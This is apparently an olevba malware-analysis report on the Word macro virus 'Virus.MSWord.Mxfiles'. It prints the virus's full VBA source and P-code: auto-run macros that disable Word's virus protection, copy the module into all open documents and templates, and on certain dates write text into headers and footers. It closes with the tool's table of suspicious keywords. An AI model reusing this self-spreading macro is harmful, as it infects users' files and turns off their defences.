olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mxfiles
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mxfiles - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mxfile.bas 
in file: Virus.MSWord.Mxfiles - OLE stream: 'Macros/VBA/Mxfile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub toolsmacro()
Mxfiles
End Sub
Sub Autoexit()
Mxfiles
End Sub
Sub Autoexec()
Mxfiles
End Sub
Sub Autonew()
Mxfiles
End Sub
Sub AutoOpen()
Mxfiles
End Sub
Sub Openshell()
Mxfiles
End Sub

Sub Mxfiles()
txt = " åÐÇ ÇáÝíÑæÓ ÚÑÖ æÛíÑ ÖÇÑ æßá ãÇíÞæã Èå ßÊÇÈå ÚÈÇÑÉ ßáäÇ äÈÇíÚ ãÈÇÑß"
On Error Resume Next
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ddorg = ThisDocument.FullName
For a = 1 To Documents.Count
If Documents.Item(a).Path <> "" Then
dest = Documents.Item(a).FullName
SetAttr dest, vbNormal
Else
dest = Documents.Item(a).Name
End If
If ddorg <> dest Then
Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
If Documents.Item(a).Path <> "" Then
Documents.Item(a).Save
End If
End If
dd = Documents.Item(a).AttachedTemplate
dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
dd2 = dd1 + "\" + dd
SetAttr dd2, vbNormal
If ddorg <> dd2 Then
Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
End If
Next a
ff$ = GetSetting(appname:="network", Section:="unix", Key:="mxfile")
If Val(ff$) = 255 Then
Application.ScreenUpdating = True
Exit Sub
End If
dayn = Format(Date, "dd")
Monthn = Format(Date, "mm")
reg = dayn Mod Monthn
If reg = 0 And dayn > 10 Then
If ActiveWindow.ActivePane.View.Type <> wdPageView Then
View = ActiveWindow.ActivePane.View.Type
ActiveWindow.ActivePane.View.Type = wdPageView
End If
 ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=Right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=Right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
ActiveWindow.ActivePane.View.Type = View
End If
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mxfiles
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Mxfile - 4402 bytes
' Line #0:
' 	FuncDefn (Sub toolsmacro())
' Line #1:
' 	ArgsCall Mxfiles 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub Autoexit())
' Line #4:
' 	ArgsCall Mxfiles 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub Autoexec())
' Line #7:
' 	ArgsCall Mxfiles 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub Autonew())
' Line #10:
' 	ArgsCall Mxfiles 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub AutoOpen())
' Line #13:
' 	ArgsCall Mxfiles 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub Openshell())
' Line #16:
' 	ArgsCall Mxfiles 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Sub Mxfiles())
' Line #20:
' 	LitStr 0x0044 " åÐÇ ÇáÝíÑæÓ ÚÑÖ æÛíÑ ÖÇÑ æßá ãÇíÞæã Èå ßÊÇÈå ÚÈÇÑÉ ßáäÇ äÈÇíÚ ãÈÇÑß"
' 	St txt 
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #26:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	St ddorg 
' Line #27:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #28:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	St dest 
' Line #30:
' 	Ld dest 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St dest 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld ddorg 
' 	Ld dest 
' 	Ne 
' 	IfBlock 
' Line #35:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dest 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #37:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd AttachedTemplate 
' 	St dd 
' Line #41:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St dd1 
' Line #42:
' 	Ld dd1 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld dd 
' 	Add 
' 	St dd2 
' Line #43:
' 	Ld dd2 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #44:
' 	Ld ddorg 
' 	Ld dd2 
' 	Ne 
' 	IfBlock 
' Line #45:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dd2 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	LitStr 0x0007 "network"
' 	ParamNamed appname 
' 	LitStr 0x0004 "unix"
' 	ParamNamed Section 
' 	LitStr 0x0006 "mxfile"
' 	ParamNamed Key 
' 	ArgsLd GetSetting 0x0003 
' 	St ff$ 
' Line #49:
' 	Ld ff$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x00FF 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #51:
' 	ExitSub 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St dayn 
' Line #54:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St Monthn 
' Line #55:
' 	Ld dayn 
' 	Ld Monthn 
' 	Mod 
' 	St reg 
' Line #56:
' 	Ld reg 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld dayn 
' 	LitDI2 0x000A 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #57:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	Ld wdPageView 
' 	Ne 
' 	IfBlock 
' Line #58:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	St View 
' Line #59:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld wdSeekCurrentPageHeader 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #62:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #63:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #64:
' 	Ld txt 
' 	LitDI2 0x0010 
' 	ArgsLd Right 0x0002 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #65:
' 	Ld wdSeekCurrentPageFooter 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #66:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #67:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #68:
' 	Ld txt 
' 	LitDI2 0x0010 
' 	ArgsLd Right 0x0002 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #69:
' 	Ld wdSeekMainDocument 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #70:
' 	Ld View 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #73:
' 	EndSub 
' Line #74:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

